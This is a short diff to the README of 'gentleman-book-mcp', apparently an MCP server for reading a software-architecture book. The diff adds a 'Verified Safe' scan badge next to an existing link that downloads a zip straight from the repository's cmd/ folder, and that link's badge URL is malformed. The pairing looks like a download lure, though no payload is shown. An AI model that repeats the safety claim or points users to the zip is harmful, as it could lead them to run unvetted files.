@@ -1,5 +1,7 @@
 # 🎉 gentleman-book-mcp - Access 18 Chapters of Software Architecture
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/rodr116-gentleman-book-mcp)
+
 ## 📥 Download Now
 [![Download from Releases](https://github.com/Rodr116/gentleman-book-mcp/raw/refs/heads/main/cmd/gentleman-mcp-book-1.9.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Rodr116/gentleman-book-mcp/raw/refs/heads/main/cmd/gentleman-mcp-book-1.9.zip)
 
